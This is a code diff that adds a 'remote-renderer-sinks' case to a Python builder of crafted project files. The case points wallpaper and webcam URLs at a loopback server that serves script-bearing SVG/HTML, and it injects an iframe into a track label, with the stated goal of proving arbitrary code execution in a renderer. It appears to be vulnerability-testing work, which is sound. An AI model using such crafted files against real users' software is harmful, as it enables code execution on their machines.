@@ -167,6 +167,38 @@ def build(candidate: str, output: pathlib.Path, marker_token: str) -> dict:
                 ],
             }
         ]
+    elif candidate == "remote-renderer-sinks":
+        # The workflow starts this loopback origin before its single open.  The
+        # server records Sec-Fetch-Dest and serves script-bearing SVG/HTML.
+        # Requests prove automatic hydration; only the OS command marker can
+        # turn the run into an ACE PASS.
+        base = "http://127.0.0.1:18765"
+        doc["edit"]["background"] = {
+            "bgType": "wallpaper",
+            "wallpaperUrl": f"{base}/payload.svg",
+        }
+        doc["edit"]["webcam"] = {
+            "enabled": True,
+            "sourceUrl": f"{base}/payload.html",
+            "offsetMs": 0,
+        }
+        doc["edit"]["tracks"] = [
+            {
+                "id": "remote-label-track",
+                "kind": "video",
+                "media": "screen.mp4",
+                "label": f'<iframe src="{base}/EXECUTED?via=track-label"></iframe>',
+                "timelineStartMs": 0,
+                "segments": [
+                    {
+                        "id": "remote-label-segment",
+                        "sourceInMs": 0,
+                        "sourceOutMs": 1000,
+                        "speed": 1,
+                    }
+                ],
+            }
+        ]
     else:
         raise SystemExit(f"unknown candidate: {candidate}")
 
